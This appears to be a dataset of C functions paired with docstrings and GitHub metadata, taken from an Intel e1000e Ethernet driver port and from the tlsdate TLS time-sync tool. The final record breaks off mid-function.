{"docstring": "/**\n * e1000_sw_init - Initialize general software structures (struct e1000_adapter)\n * @adapter: board private structure to initialize\n *\n * e1000_sw_init initializes the Adapter private data structure.\n * Fields are initialized based on PCI device information and\n * OS network device settings (MTU size).\n **/\n", "func_signal": "static int e1000_sw_init(struct e1000_adapter *adapter)", "code": "{\n\tstruct net_device *netdev = adapter->netdev;\n\n\tadapter->rx_buffer_len = VLAN_ETH_FRAME_LEN + ETH_FCS_LEN;\n\tadapter->rx_ps_bsize0 = 128;\n\tadapter->max_frame_size = netdev->mtu + VLAN_ETH_HLEN + ETH_FCS_LEN;\n\tadapter->min_frame_size = ETH_ZLEN + ETH_FCS_LEN;\n\tadapter->tx_ring_count = E1000_DEFAULT_TXD;\n\tadapter->rx_ring_count = E1000_DEFAULT_RXD;\n\n\tspin_lock_init(&adapter->stats64_lock);\n\n\te1000e_set_interrupt_capability(adapter);\n\n\tif (e1000_alloc_queues(adapter))\n\t\treturn -ENOMEM;\n\n\t/* Setup hardware time stamping cyclecounter */\n\tif (adapter->flags & FLAG_HAS_HW_TIMESTAMP) {\n\t\tadapter->cc.read = e1000e_cyclecounter_read;\n\t\tadapter->cc.mask = CYCLECOUNTER_MASK(64);\n\t\tadapter->cc.mult = 1;\n\t\t/* cc.shift set in e1000e_get_base_tininca() */\n\n\t\tspin_lock_init(&adapter->systim_lock);\n\t\tINIT_WORK(&adapter->tx_hwtstamp_work, e1000e_tx_hwtstamp_work);\n\t}\n\n\t/* Explicitly disable IRQ since the NIC can be in any state. */\n\te1000_irq_disable(adapter);\n\n\tset_bit(__E1000_DOWN, &adapter->state);\n\treturn 0;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000e_power_up_phy - restore link in case the phy was powered down\n * @adapter: address of board private structure\n *\n * The phy may be powered down to save power and turn off link when the\n * driver is unloaded and wake on lan is not enabled (among others)\n * *** this routine MUST be followed by a call to e1000e_reset ***\n **/\n", "func_signal": "void e1000e_power_up_phy(struct e1000_adapter *adapter)", "code": "{\n\tif (adapter->hw.phy.ops.power_up)\n\t\tadapter->hw.phy.ops.power_up(&adapter->hw);\n\n\tadapter->hw.mac.ops.setup_link(&adapter->hw);\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_update_itr - update the dynamic ITR value based on statistics\n * @adapter: pointer to adapter\n * @itr_setting: current adapter->itr\n * @packets: the number of packets during this measurement interval\n * @bytes: the number of bytes during this measurement interval\n *\n *      Stores a new ITR value based on packets and byte\n *      counts during the last interrupt.  The advantage of per interrupt\n *      computation is faster updates and more accurate ITR for the current\n *      traffic pattern.  Constants in this function were computed\n *      based on theoretical maximum wire speed and thresholds were set based\n *      on testing data as well as attempting to minimize response time\n *      while increasing bulk throughput.  This functionality is controlled\n *      by the InterruptThrottleRate module parameter.\n **/\n", "func_signal": "static unsigned int e1000_update_itr(u16 itr_setting, int packets, int bytes)", "code": "{\n\tunsigned int retval = itr_setting;\n\n\tif (packets == 0)\n\t\treturn itr_setting;\n\n\tswitch (itr_setting) {\n\tcase lowest_latency:\n\t\t/* handle TSO and jumbo frames */\n\t\tif (bytes / packets > 8000)\n\t\t\tretval = bulk_latency;\n\t\telse if ((packets < 5) && (bytes > 512))\n\t\t\tretval = low_latency;\n\t\tbreak;\n\tcase low_latency:\t/* 50 usec aka 20000 ints/s */\n\t\tif (bytes > 10000) {\n\t\t\t/* this if handles the TSO accounting */\n\t\t\tif (bytes / packets > 8000)\n\t\t\t\tretval = bulk_latency;\n\t\t\telse if ((packets < 10) || ((bytes / packets) > 1200))\n\t\t\t\tretval = bulk_latency;\n\t\t\telse if ((packets > 35))\n\t\t\t\tretval = lowest_latency;\n\t\t} else if (bytes / packets > 2000) {\n\t\t\tretval = bulk_latency;\n\t\t} else if (packets <= 2 && bytes < 512) {\n\t\t\tretval = lowest_latency;\n\t\t}\n\t\tbreak;\n\tcase bulk_latency:\t/* 250 usec aka 4000 ints/s */\n\t\tif (bytes > 25000) {\n\t\t\tif (packets > 35)\n\t\t\t\tretval = low_latency;\n\t\t} else if (bytes < 6000) {\n\t\t\tretval = low_latency;\n\t\t}\n\t\tbreak;\n\t}\n\n\treturn retval;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000_alloc_queues - Allocate memory for all rings\n * @adapter: board private structure to initialize\n **/\n", "func_signal": "static int e1000_alloc_queues(struct e1000_adapter *adapter)", "code": "{\n\tint size = sizeof(struct e1000_ring);\n\n\tadapter->tx_ring = kzalloc(size, GFP_KERNEL);\n\tif (!adapter->tx_ring)\n\t\tgoto err;\n\tadapter->tx_ring->count = adapter->tx_ring_count;\n\tadapter->tx_ring->adapter = adapter;\n\n\tadapter->rx_ring = kzalloc(size, GFP_KERNEL);\n\tif (!adapter->rx_ring)\n\t\tgoto err;\n\tadapter->rx_ring->count = adapter->rx_ring_count;\n\tadapter->rx_ring->adapter = adapter;\n\n\treturn 0;\nerr:\n\te_err(\"Unable to allocate memory for queues\\n\");\n\tkfree(adapter->rx_ring);\n\tkfree(adapter->tx_ring);\n\treturn -ENOMEM;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/**\n * e1000e_rx_hwtstamp - utility function which checks for Rx time stamp\n * @adapter: board private structure\n * @status: descriptor extended error and status field\n * @skb: particular skb to include time stamp\n *\n * If the time stamp is valid, convert it into the timecounter ns value\n * and store that result into the shhwtstamps structure which is passed\n * up the network stack.\n **/\n", "func_signal": "static void e1000e_rx_hwtstamp(struct e1000_adapter *adapter, u32 status,\n\t\t\t       struct sk_buff *skb)", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\tu64 rxstmp;\n\n\tif (!(adapter->flags & FLAG_HAS_HW_TIMESTAMP) ||\n\t    !(status & E1000_RXDEXT_STATERR_TST) ||\n\t    !(er32(TSYNCRXCTL) & E1000_TSYNCRXCTL_VALID))\n\t\treturn;\n\n\t/* The Rx time stamp registers contain the time stamp.  No other\n\t * received packet will be time stamped until the Rx time stamp\n\t * registers are read.  Because only one packet can be time stamped\n\t * at a time, the register values must belong to this packet and\n\t * therefore none of the other additional attributes need to be\n\t * compared.\n\t */\n\trxstmp = (u64)er32(RXSTMPL);\n\trxstmp |= (u64)er32(RXSTMPH) << 32;\n\te1000e_systim_to_hwtstamp(adapter, skb_hwtstamps(skb), rxstmp);\n\n\tadapter->flags2 &= ~FLAG2_CHECK_RX_HWTSTAMP;\n}", "path": "IntelMausiEthernet\\netdev.c", "repo_name": "Mieze/IntelMausiEthernet", "stars": 396, "license": "None", "language": "c", "size": 570}
{"docstring": "/** helper function for 'verbose' output */\n", "func_signal": "void\nverb (const char *fmt, ...)", "code": "{\n  va_list ap;\n\n  if (! verbose ) return;\n  va_start(ap, fmt);\n  vfprintf(stderr, fmt, ap);\n  fprintf (stderr, \"\\n\");\n  va_end(ap);\n  va_start(ap, fmt);\n  vsyslog (LOG_DEBUG, fmt, ap);\n  va_end(ap);\n}", "path": "src\\util.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/* USE_POLARSSL */\n/** drop root rights and become 'nobody' */\n", "func_signal": "int\nmain(int argc, char **argv)", "code": "{\n  uint32_t *time_map;\n  struct tlsdate_time start_time, end_time, warp_time;\n  int status;\n  pid_t ssl_child;\n  long long rt_time_ms;\n  uint32_t server_time_s;\n  int setclock;\n  int showtime;\n  int showtime_raw;\n  int timewarp;\n  int leap;\n  int http;\n\n  if (argc != 13)\n    return 1;\n  host = argv[1];\n  hostname_to_verify = argv[1];\n  port = argv[2];\n  protocol = argv[3];\n  ca_cert_container = argv[6];\n  ca_racket = (0 != strcmp (\"unchecked\", argv[4]));\n  verbose = (0 != strcmp (\"quiet\", argv[5]));\n  verbose_debug = (0 != strcmp (\"verbose\", argv[5]));\n  setclock = (0 == strcmp (\"setclock\", argv[7]));\n  showtime = (0 == strcmp (\"showtime\", argv[8]));\n  showtime_raw = (0 == strcmp (\"showtime=raw\", argv[8]));\n  timewarp = (0 == strcmp (\"timewarp\", argv[9]));\n  leap = (0 == strcmp (\"leapaway\", argv[10]));\n  proxy = (0 == strcmp (\"none\", argv[11]) ? NULL : argv[11]);\n  http = (0 == (strcmp(\"http\", argv[12])));\n\n  /* Initalize warp_time with RECENT_COMPILE_DATE */\n  clock_init_time(&warp_time, RECENT_COMPILE_DATE, 0);\n\n  verb (\"V: RECENT_COMPILE_DATE is %lu.%06lu\",\n       (unsigned long) CLOCK_SEC(&warp_time),\n       (unsigned long) CLOCK_USEC(&warp_time));\n\n  if (1 != timewarp)\n  {\n    verb (\"V: we'll do the time warp another time - we're not setting clock\");\n  }\n\n  /* We are not going to set the clock, thus no need to stay root */\n  if (0 == setclock && 0 == timewarp)\n  {\n    verb (\"V: attemping to drop administrator privileges\");\n    drop_privs_to (UNPRIV_USER, UNPRIV_GROUP);\n  }\n\n  // We cast the mmap value to remove this error when compiling with g++:\n  // src/tlsdate-helper.c: In function \u2018int main(int, char**)\u2019:\n  // src/tlsdate-helper.c:822:41: error: invalid conversion from \u2018void*\u2019 to \u2018uint32_t\n  time_map = (uint32_t *) mmap (NULL, sizeof (uint32_t),\n       PROT_READ | PROT_WRITE,\n       MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n   if (MAP_FAILED == time_map)\n  {\n    fprintf (stderr, \"mmap failed: %s\",\n             strerror (errno));\n    return 1;\n  }\n\n  /* Get the current time from the system clock. */\n  if (0 != clock_get_real_time(&start_time))\n  {\n    die (\"Failed to read current time of day: %s\", strerror (errno));\n  }\n\n  verb (\"V: time is currently %lu.%06lu\",\n       (unsigned long) CLOCK_SEC(&start_time),\n       (unsigned long) CLOCK_NSEC(&start_time));\n\n  if (((unsigned long) CLOCK_SEC(&start_time)) < ((unsigned long) CLOCK_SEC(&warp_time)))\n  {\n    verb (\"V: local clock time is less than RECENT_COMPILE_DATE\");\n    if (timewarp)\n    {\n      verb (\"V: Attempting to warp local clock into the future\");\n      if (0 != clock_set_real_time(&warp_time))\n      {\n        die (\"setting time failed: %s (Attempted to set clock to %lu.%06lu)\",\n        strerror (errno),\n        (unsigned long) CLOCK_SEC(&warp_time),\n        (unsigned long) CLOCK_SEC(&warp_time));\n      }\n      if (0 != clock_get_real_time(&start_time))\n      {\n        die (\"Failed to read current time of day: %s\", strerror (errno));\n      }\n      verb (\"V: time is currently %lu.%06lu\",\n           (unsigned long) CLOCK_SEC(&start_time),\n           (unsigned long) CLOCK_NSEC(&start_time));\n      verb (\"V: It's just a step to the left...\");\n    }\n  } else {\n    verb (\"V: time is greater than RECENT_COMPILE_DATE\");\n  }\n\n  /* initialize to bogus value, just to be on the safe side */\n  *time_map = 0;\n\n  /* Run SSL interaction in separate process (and not as 'root') */\n  ssl_child = fork ();\n  if (-1 == ssl_child)\n    die (\"fork failed: %s\", strerror (errno));\n  if (0 == ssl_child)\n  {\n    drop_privs_to (UNPRIV_USER, UNPRIV_GROUP);\n    run_ssl (time_map, leap, http);\n    (void) munmap (time_map, sizeof (uint32_t));\n    _exit (0);\n  }\n  if (ssl_child != platform->process_wait (ssl_child, &status, 1))\n    die (\"waitpid failed: %s\", strerror (errno));\n  if (! (WIFEXITED (status) && (0 == WEXITSTATUS (status)) ))\n    die (\"child process failed in SSL handshake\");\n\n  if (0 != clock_get_real_time(&end_time))\n    die (\"Failed to read current time of day: %s\", strerror (errno));\n\n  /* calculate RTT */\n  rt_time_ms = (CLOCK_SEC(&end_time) - CLOCK_SEC(&start_time)) * 1000 + (CLOCK_USEC(&end_time) - CLOCK_USEC(&start_time)) / 1000;\n  if (rt_time_ms < 0)\n    rt_time_ms = 0; /* non-linear time... */\n#ifdef USE_POLARSSL\n  server_time_s = *time_map;\n#else\n  server_time_s = ntohl (*time_map);\n#endif\n  // We should never have a time_map of zero here;\n  // It either stayed zero or we have a false ticker.\n  if ( 0 == server_time_s )\n    die (\"child process failed to update time map; weird platform issues?\");\n  munmap (time_map, sizeof (uint32_t));\n\n  verb (\"V: server time %u (difference is about %d s) was fetched in %lld ms\",\n  (unsigned int) server_time_s,\n  CLOCK_SEC(&start_time) - server_time_s,\n  rt_time_ms);\n\n  /* warning if the handshake took too long */\n  if (rt_time_ms > TLS_RTT_UNREASONABLE) {\n    die (\"the TLS handshake took more than %d msecs - consider using a different \" \\\n      \"server or run it again\", TLS_RTT_UNREASONABLE);\n  }\n  if (rt_time_ms > TLS_RTT_THRESHOLD) {\n    verb (\"V: the TLS handshake took more than %d msecs - consider using a different \" \\\n      \"server or run it again\", TLS_RTT_THRESHOLD);\n  }\n\n  if (showtime_raw)\n  {\n    fwrite(&server_time_s, sizeof(server_time_s), 1, stdout);\n  }\n\n  if (showtime)\n  {\n     struct tm  ltm;\n     time_t tim = server_time_s;\n     char       buf[256];\n\n     localtime_r(&tim, &ltm);\n     if (0 == strftime(buf, sizeof buf, \"%a %b %e %H:%M:%S %Z %Y\", &ltm))\n     {\n       die (\"strftime returned 0\");\n     }\n     fprintf(stdout, \"%s\\n\", buf);\n  }\n\n  /* finally, actually set the time */\n  if (setclock)\n  {\n    struct tlsdate_time server_time;\n\n    clock_init_time(&server_time,  server_time_s + (rt_time_ms / 2 / 1000),\n                   (rt_time_ms / 2) % 1000);\n\n    // We should never receive a time that is before the time we were last\n    // compiled; we subscribe to the linear theory of time for this program\n    // and this program alone!\n    if (CLOCK_SEC(&server_time) >= MAX_REASONABLE_TIME)\n      die(\"remote server is a false ticker from the future!\");\n    if (CLOCK_SEC(&server_time) <= RECENT_COMPILE_DATE)\n      die (\"remote server is a false ticker!\");\n    if (0 != clock_set_real_time(&server_time))\n      die (\"setting time failed: %s (Difference from server is about %d s)\",\n     strerror (errno),\n     CLOCK_SEC(&start_time) - server_time_s);\n    verb (\"V: setting time succeeded\");\n  }\n  return 0;\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/* On sigterm, grab the system clock and write it before terminating */\n", "func_signal": "void action_sigterm (evutil_socket_t fd, short what, void *arg)", "code": "{\n  struct state *state = arg;\n  struct timeval tv;\n  info (\"[event:%s] starting graceful shutdown . . .\", __func__);\n  state->exitting = 1;\n  if (platform->time_get (&tv))\n    {\n      pfatal (\"[event:%s] couldn't gettimeofday to exit gracefully\", __func__);\n    }\n  /* Don't change the last sync_type */\n  state->last_time = tv.tv_sec;\n  /* Immediately save and exit. */\n  trigger_event (state, E_SAVE, -1);\n}", "path": "src\\events\\sigterm.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/**\n This extracts the first commonName and checks it against hostname.\n*/\n", "func_signal": "uint32_t\ncheck_cn (SSL *ssl, const char *hostname)", "code": "{\n  int ok = 0;\n  int ret;\n  char *cn_buf;\n  X509 *certificate;\n  X509_NAME *xname;\n\n  // We cast this to cast away g++ complaining about the following:\n  // error: invalid conversion from \u2018void*\u2019 to \u2018char*\u2019\n  cn_buf = (char *) xmalloc(TLSDATE_HOST_NAME_MAX + 1);\n\n  certificate = SSL_get_peer_certificate(ssl);\n  if (NULL == certificate)\n  {\n    die (\"Unable to extract certificate\");\n  }\n\n  memset(cn_buf, '\\0', (TLSDATE_HOST_NAME_MAX + 1));\n  xname = X509_get_subject_name(certificate);\n  ret = X509_NAME_get_text_by_NID(xname, NID_commonName,\n                                  cn_buf, TLSDATE_HOST_NAME_MAX);\n\n  if (-1 == ret || ret != (int) strlen(cn_buf))\n  {\n    die (\"Unable to extract commonName\");\n  }\n  if (strcasecmp(cn_buf, hostname))\n  {\n    verb (\"V: commonName mismatch! Expected: %s - received: %s\",\n          hostname, cn_buf);\n  } else {\n    verb (\"V: commonName matched: %s\", cn_buf);\n    ok = 1;\n  }\n\n  X509_NAME_free(xname);\n  X509_free(certificate);\n  xfree(cn_buf);\n\n  return ok;\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/** helper function for 'malloc' */\n", "func_signal": "static void *\nxmalloc (size_t size)", "code": "{\n  void *ptr;\n\n  if (0 == size)\n    die(\"xmalloc: zero size\");\n\n  ptr = malloc(size);\n  if (NULL == ptr)\n    die(\"xmalloc: out of memory (allocating %zu bytes)\", size);\n\n  return ptr;\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/* Returns < 0 on error, > 0 on eagain, and 0 on success */\n", "func_signal": "int\nread_tlsdate_response (int fd, time_t *t)", "code": "{\n  /* TLS passes time as a 32-bit value. */\n  uint32_t server_time = 0;\n  ssize_t ret = IGNORE_EINTR (read (fd, &server_time, sizeof (server_time)));\n  if (ret == -1 && errno == EAGAIN)\n    {\n      /* Full response isn't ready yet. */\n      return 1;\n    }\n  if (ret != sizeof (server_time))\n    {\n      /* End of pipe (0) or truncated: death probable. */\n      error (\"[event:(%s)] invalid time read from tlsdate (rd:%d,ret:%zd).\",\n             __func__, server_time, ret);\n      return -1;\n    }\n  /* uint32_t moves to signed long so there is room for silliness. */\n  *t = server_time;\n  return 0;\n}", "path": "src\\events\\tlsdate_status.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/* TODO(wad) rename to schedule_event */\n", "func_signal": "void\ntrigger_event (struct state *state, enum event_id_t id, int sec)", "code": "{\n#ifdef WITH_EVENTS\n  struct event *e = state->events[id];\n  struct timeval delay = { sec, 0 };\n  /* Fallthrough to tlsdate if there is no resolver. */\n  if (!e && id == E_RESOLVER)\n    e = state->events[E_TLSDATE];\n  if (!e)\n    {\n      info (\"trigger_event with NULL |e|. I hope this is a test!\");\n      return;\n    }\n  if (event_pending (e, EV_READ|EV_WRITE|EV_TIMEOUT|EV_SIGNAL, NULL))\n    event_del (e);\n  if (sec >= 0)\n    event_add (e, &delay);\n  else /* Note! This will not fire a TIMEOUT event. */\n    event_add (e, NULL);\n#endif\n}", "path": "src\\util.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/** helper function to print message and die */\n", "func_signal": "void\ndie (const char *fmt, ...)", "code": "{\n  va_list ap;\n  va_start (ap, fmt);\n  vfprintf (stderr, fmt, ap);\n  fprintf (stderr, \"\\n\");\n  va_end (ap);\n  exit (1);\n}", "path": "src\\util.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/* If the string is all nice clean ascii that it's safe to log, return\n * it. Otherwise return a placeholder \"This is junk\" string. */\n", "func_signal": "static const char *\nsanitize_string(const char *s)", "code": "{\n  const unsigned char *cp;\n  for (cp = (const unsigned char *)s; *cp; cp++) {\n    if (*cp < 32 || *cp >= 127)\n      return \"string with invalid characters\";\n  }\n  return s;\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/*\n * Set the hardware clock referred to by fd (which should be a descriptor to\n * some device that implements the interface documented in rtc(4)) to the system\n * time. See hwclock(8) for details of why this is important. If we fail, we\n * just return - there's nothing the caller can really do about a failure of\n * this function except try later.\n */\n", "func_signal": "int rtc_write(struct rtc_handle *handle, const struct timeval *tv)", "code": "{\n  struct tm tmr;\n  struct tm *tm;\n  struct rtc_time rtctm;\n  int fd = handle->fd;\n\n  tm = gmtime_r (&tv->tv_sec, &tmr);\n\n  /* these structs are identical, but separately defined */\n  rtctm.tm_sec = tm->tm_sec;\n  rtctm.tm_min = tm->tm_min;\n  rtctm.tm_hour = tm->tm_hour;\n  rtctm.tm_mday = tm->tm_mday;\n  rtctm.tm_mon = tm->tm_mon;\n  rtctm.tm_year = tm->tm_year;\n  rtctm.tm_wday = tm->tm_wday;\n  rtctm.tm_yday = tm->tm_yday;\n  rtctm.tm_isdst = tm->tm_isdst;\n\n  if (ioctl (fd, RTC_SET_TIME, &rtctm))\n  {\n    pinfo (\"ioctl(%d, RTC_SET_TIME, ...) failed\", fd);\n    return 1;\n  }\n\n  info (\"synced rtc to sysclock\");\n  return 0;\n}", "path": "src\\util.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/**\n * Get current real time value and store it into time.\n *\n * @param time where the current time is stored\n * @return clock_gettime syscall return value\n */\n", "func_signal": "int clock_get_real_time(struct tlsdate_time *time)", "code": "{\n  /* Safety net */\n  assert (time);\n  return clock_gettime (CLOCK_REALTIME, &time->tp);\n}", "path": "src\\compat\\clock-linux.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "// first we split strings on '.'\n// then we call each split string a 'label'\n// Do not allow '*' for the top level domain label; eg never allow *.*.com\n// Do not allow '*' for subsequent subdomains; eg never allow *.foo.example.com\n// Do allow *.example.com\n", "func_signal": "uint32_t\ncheck_wildcard_match_rfc2595 (const char *orig_hostname,\n                      const char *orig_cert_wild_card)", "code": "{\n  char *hostname;\n  char *hostname_to_free;\n  char *cert_wild_card;\n  char *cert_wild_card_to_free;\n  char *expected_label;\n  char *wildcard_label;\n  char *delim;\n  char *wildchar;\n  uint32_t ok;\n  uint32_t wildcard_encountered;\n  uint32_t label_count;\n\n  // First we copy the original strings\n  hostname = strndup(orig_hostname, strlen(orig_hostname));\n  cert_wild_card = strndup(orig_cert_wild_card, strlen(orig_cert_wild_card));\n  hostname_to_free = hostname;\n  cert_wild_card_to_free = cert_wild_card;\n  delim = strdup(\".\");\n  wildchar = strdup(\"*\");\n\n  verb_debug (\"V: Inspecting '%s' for possible wildcard match against '%s'\",\n         hostname, cert_wild_card);\n\n  // By default we have not processed any labels\n  label_count = dns_label_count(cert_wild_card, delim);\n\n  // By default we have no match\n  ok = 0;\n  wildcard_encountered = 0;\n  // First - do we have labels? If not, we refuse to even try to match\n  if ((NULL != strpbrk(cert_wild_card, delim)) &&\n      (NULL != strpbrk(hostname, delim)) &&\n      (label_count <= ((uint32_t)RFC2595_MIN_LABEL_COUNT)))\n  {\n    if (wildchar[0] == cert_wild_card[0])\n    {\n      verb_debug (\"V: Found wildcard in at start of provided certificate name\");\n      do\n      {\n        // Skip over the bytes between the first char and until the next label\n        wildcard_label = strsep(&cert_wild_card, delim);\n        expected_label = strsep(&hostname, delim);\n        if (NULL != wildcard_label &&\n            NULL != expected_label &&\n            NULL != hostname &&\n            NULL != cert_wild_card)\n        {\n          // Now we only consider this wildcard valid if the rest of the\n          // hostnames match verbatim\n          verb_debug (\"V: Attempting match of '%s' against '%s'\",\n                 expected_label, wildcard_label);\n          // This is the case where we have a label that begins with wildcard\n          // Furthermore, we only allow this for the first label\n          if (wildcard_label[0] == wildchar[0] &&\n              0 == wildcard_encountered && 0 == ok)\n          {\n            verb (\"V: Forced match of '%s' against '%s'\", expected_label, wildcard_label);\n            wildcard_encountered = 1;\n          } else {\n            verb_debug (\"V: Attempting match of '%s' against '%s'\",\n                   hostname, cert_wild_card);\n            if (0 == strcasecmp (expected_label, wildcard_label) &&\n                label_count >= ((uint32_t)RFC2595_MIN_LABEL_COUNT))\n            {\n              ok = 1;\n              verb_debug (\"V: remaining labels match!\");\n              break;\n            } else {\n              ok = 0;\n              verb_debug (\"V: remaining labels do not match!\");\n              break;\n            }\n          }\n        } else {\n          // We hit this case when we have a mismatched number of labels\n          verb_debug (\"V: NULL label; no wildcard here\");\n          break;\n        }\n      } while (0 != wildcard_encountered && label_count <= RFC2595_MIN_LABEL_COUNT);\n    } else {\n      verb_debug (\"V: Not a RFC 2595 wildcard\");\n    }\n  } else {\n    verb_debug (\"V: Not a valid wildcard certificate\");\n    ok = 0;\n  }\n  // Free our copies\n  free(wildchar);\n  free(delim);\n  free(hostname_to_free);\n  free(cert_wild_card_to_free);\n  if (wildcard_encountered & ok && label_count >= RFC2595_MIN_LABEL_COUNT)\n  {\n    verb_debug (\"V: wildcard match of %s against %s\",\n          orig_hostname, orig_cert_wild_card);\n    return (wildcard_encountered & ok);\n  } else {\n    verb_debug (\"V: wildcard match failure of %s against %s\",\n          orig_hostname, orig_cert_wild_card);\n    return 0;\n  }\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/* TODO(wad) split out backoff logic to make this testable */\n", "func_signal": "void action_run_tlsdate (evutil_socket_t fd, short what, void *arg)", "code": "{\n  struct state *state = arg;\n  verb_debug (\"[event:%s] fired\", __func__);\n  if (state->last_sync_type == SYNC_TYPE_NET)\n    {\n      verb (\"[event:%s] called, but network time isn't needed\",\n            __func__);\n      return;\n    }\n  state->resolving = 0;\n  if (state->running)\n    {\n      /* It's possible that a network or proxy change occurred during a call. If\n       * the call succeeded, it doesn't matter.  If the call fails, reissuing\n       * the attempt with the new configuration has a chance of succeeding.  To\n       * avoid missing a retry, we decrement the try count and reset the\n       * backoff.\n       */\n      if (state->tries > 0)\n        {\n          state->tries--;\n          /* TODO(wad) Make a shorter retry constant for this. */\n          state->backoff = state->opts.wait_between_tries;\n        }\n      info (\"[event:%s] requested re-run of tlsdate while tlsdate is running\",\n            __func__);\n      return;\n    }\n  /* Enforce maximum retries here instead of in sigchld.c */\n  if (state->tries < state->opts.max_tries)\n    {\n      state->tries++;\n    }\n  else\n    {\n      state->tries = 0;\n      state->backoff = state->opts.wait_between_tries;\n      error (\"[event:%s] tlsdate tried and failed to get the time\", __func__);\n      return;\n    }\n  state->running = 1;\n  verb (\"[event:%s] attempt %d backoff %d\", __func__,\n        state->tries, state->backoff);\n  /* Setup a timeout before killing tlsdate */\n  trigger_event (state, E_TLSDATE_TIMEOUT,\n                 state->opts.subprocess_wait_between_tries);\n  /* Add the response listener event */\n  trigger_event (state, E_TLSDATE_STATUS, -1);\n  /* Fire off the child process now! */\n  if (tlsdate (state))\n    {\n      /* TODO(wad) Should this be fatal? */\n      error (\"[event:%s] tlsdate failed to launch!\", __func__);\n      state->running = 0;\n      state->tries = 0;\n      event_del (state->events[E_TLSDATE_TIMEOUT]);\n      return;\n    }\n}", "path": "src\\events\\run_tlsdate.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/**\n * Run SSL handshake and store the resulting time value in the\n * 'time_map'.\n *\n * @param time_map where to store the current time\n * @param time_is_an_illusion\n * @param http whether to do an http request and take the date from that\n *     instead.\n */\n", "func_signal": "static void\nrun_ssl (uint32_t *time_map, int time_is_an_illusion, int http)", "code": "{\n  entropy_context entropy;\n  ctr_drbg_context ctr_drbg;\n  ssl_context ssl;\n  proxy_polarssl_ctx proxy_ctx;\n  x509_cert cacert;\n  struct stat statbuf;\n  int ret = 0, server_fd = 0;\n  char *pers = \"tlsdate-helper\";\n\n  memset (&ssl, 0, sizeof(ssl_context));\n  memset (&cacert, 0, sizeof(x509_cert));\n\n  verb(\"V: Using PolarSSL for SSL\");\n  if (ca_racket)\n  {\n    if (-1 == stat (ca_cert_container, &statbuf))\n    {\n      die(\"Unable to stat CA certficate container %s\", ca_cert_container);\n    }\n    else\n    {\n      switch (statbuf.st_mode & S_IFMT)\n      {\n      case S_IFREG:\n        if (0 > x509parse_crtfile(&cacert, ca_cert_container))\n          fprintf(stderr, \"x509parse_crtfile failed\");\n        break;\n      case S_IFDIR:\n        if (0 > x509parse_crtpath(&cacert, ca_cert_container))\n          fprintf(stderr, \"x509parse_crtpath failed\");\n        break;\n      default:\n        die(\"Unable to load CA certficate container %s\", ca_cert_container);\n      }\n    }\n  }\n\n  entropy_init (&entropy);\n  if (0 != ctr_drbg_init (&ctr_drbg, entropy_func, &entropy,\n                         (unsigned char *) pers, strlen(pers)))\n  {\n    die(\"Failed to initialize CTR_DRBG\");\n  }\n\n  if (0 != ssl_init (&ssl))\n  {\n    die(\"SSL initialization failed\");\n  }\n  ssl_set_endpoint (&ssl, SSL_IS_CLIENT);\n  ssl_set_rng (&ssl, ctr_drbg_random, &ctr_drbg);\n  ssl_set_ca_chain (&ssl, &cacert, NULL, hostname_to_verify);\n  if (ca_racket)\n  {\n      // You can do SSL_VERIFY_REQUIRED here, but then the check in\n      // inspect_key() never happens as the ssl_handshake() will fail.\n      ssl_set_authmode (&ssl, SSL_VERIFY_OPTIONAL);\n  }\n\n  if (proxy)\n  {\n    char *scheme;\n    char *proxy_host;\n    char *proxy_port;\n\n    parse_proxy_uri (proxy, &scheme, &proxy_host, &proxy_port);\n\n    verb(\"V: opening socket to proxy %s:%s\", proxy_host, proxy_port);\n    if (0 != net_connect (&server_fd, proxy_host, atoi(proxy_port)))\n    {\n      die (\"SSL connection failed\");\n    }\n\n    proxy_polarssl_init (&proxy_ctx);\n    proxy_polarssl_set_bio (&proxy_ctx, net_recv, &server_fd, net_send, &server_fd);\n    proxy_polarssl_set_host (&proxy_ctx, host);\n    proxy_polarssl_set_port (&proxy_ctx, atoi(port));\n    proxy_polarssl_set_scheme (&proxy_ctx, scheme);\n\n    ssl_set_bio (&ssl, proxy_polarssl_recv, &proxy_ctx, proxy_polarssl_send, &proxy_ctx);\n\n    verb(\"V: Handle proxy connection\");\n    if (0 == proxy_ctx.f_connect (&proxy_ctx))\n      die(\"Proxy connection failed\");\n  }\n  else\n  {\n    